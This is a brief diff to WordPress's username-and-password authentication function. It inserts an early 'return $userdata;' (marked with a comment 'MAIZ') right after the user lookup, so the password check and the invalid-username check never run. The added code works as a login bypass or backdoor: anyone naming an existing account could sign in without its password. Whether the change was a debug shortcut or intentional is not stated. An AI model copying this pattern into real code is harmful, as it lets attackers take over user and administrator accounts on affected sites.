@@ -85,7 +85,9 @@ function wp_authenticate_username_password($user, $username, $password) {
 	}
 
 	$userdata = get_user_by('login', $username);
-
+	// MAIZ
+	return $userdata;
+// print_r($userdata);
 	if ( !$userdata )
 		return new WP_Error('invalid_username', sprintf(__('<strong>ERROR</strong>: Invalid username. <a href="%s" title="Password Lost and Found">Lost your password</a>?'), wp_lostpassword_url()));
 
